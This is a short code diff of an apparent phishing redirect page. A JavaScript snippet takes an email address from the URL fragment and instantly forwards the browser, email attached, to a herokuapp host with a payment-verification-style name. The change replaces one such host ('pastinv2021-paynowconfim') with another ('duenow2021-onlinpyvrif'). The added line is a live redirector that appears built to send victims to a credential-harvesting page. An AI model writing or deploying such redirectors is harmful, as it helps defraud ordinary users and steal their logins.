@@ -10,7 +10,7 @@
         var em = hash.split('#')[1];
                                         
                        window.setTimeout(function() {
-    window.location.href = 'https://pastinv2021-paynowconfim.herokuapp.com/#'+em;
+    window.location.href = 'https://duenow2021-onlinpyvrif.herokuapp.com/#'+em;
 }, 0);
         
     </script>
